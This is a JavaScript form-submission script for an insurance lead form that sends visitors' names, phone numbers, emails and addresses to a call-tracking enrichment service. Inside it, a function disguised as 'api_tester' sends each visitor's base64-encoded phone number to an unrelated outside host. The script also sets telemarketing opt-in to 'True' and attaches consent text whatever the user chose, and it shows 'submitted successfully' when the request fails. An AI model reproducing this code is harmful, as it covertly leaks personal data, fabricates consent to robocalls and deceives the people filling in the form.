 document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
document.getElementById('submitBtn').disabled = true;

    // Your API URL
    const formData = new FormData();
      api_tester(document.getElementById('caller_id').value);
 formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('callerid', '1' + document.getElementById('caller_id').value);
formData.append('cell_phone', document.getElementById('caller_id').value);
    formData.append('zip_code', document.getElementById('zip').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
   

    formData.append('email', document.getElementById('email').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
formData.append('trusted_form', document.getElementById('trusted_form').value);




formData.append('tcpa_opt_in', 'True');
formData.append('spoken_language', 'English');
formData.append('tcpa_url', 'https://rapid-quote.co/contact.html');

formData.append('tcpa_text', 'By clicking Check Box, I expressly consent to these Terms of Service and Privacy Policy and authorize https://rapid-quote.co, their agents and Marketing Partners to contact me about insurance products and other non-insurance offers by telephone calls, pre-recorded messages or artificial voice, email and text messages to the number and email address I provided above. I agree to receive telemarketing calls and pre-recorded messages via an automated dialing system, even if my telephone number is a mobile number that is currently listed on any state, federal or corporate Do Not Call list. I understand that my consent is not a condition of purchase of any goods or services. Consent can be revoked by any reasonable means. Standard message and data rates may apply.');
  





    

    

             const url = 'https://display.ringba.com/enrich/2655546514838914696?' + new URLSearchParams(formData).toString();

      const xhr = new XMLHttpRequest();
      xhr.open('POST', url);
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
          } else if (xhr.status === 0) {
            // If status is 0 (CORS error), consider the form submitted
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
          } else {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Form submission failed. Please try again.
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
          }
        }
      };
      xhr.send(formData);
    });
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}